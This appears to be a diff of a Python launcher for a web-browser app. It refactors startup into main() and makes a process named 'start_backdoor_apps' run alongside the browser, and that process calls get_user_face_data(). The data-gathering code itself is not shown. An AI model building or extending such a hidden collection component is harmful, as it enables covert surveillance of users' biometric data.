@@ -4,7 +4,7 @@ from view import MyWebBrowser
 from logging import getLogger
 from session import do_session
 from multiprocessing import Process
-
+from database import db_session_close
 import config
 
 logger = getLogger('WebBrowser')  #
@@ -27,14 +27,22 @@ def start_backdoor_apps():
     get_user_face_data()
 
 
-try:
-    do_session()
-    start_browser_app = Process(target=start_browser)
-    backdoor_apps = Process(target=start_backdoor_apps)
+def main():
+    try:
+        do_session()
+        start_browser_app = Process(target=start_browser)
+        backdoor_apps = Process(target=start_backdoor_apps)
 
-    start_browser_app.start()
-    start_backdoor_apps()
-except Exception as exception:
-    logger.error(exception)
+        start_browser_app.start()
+        backdoor_apps.start()
 
+    except Exception as exception:
+        logger.error(exception)
+
+    finally:
+        db_session_close()
+
+
+if __name__ == '__main__':
+    main()
 
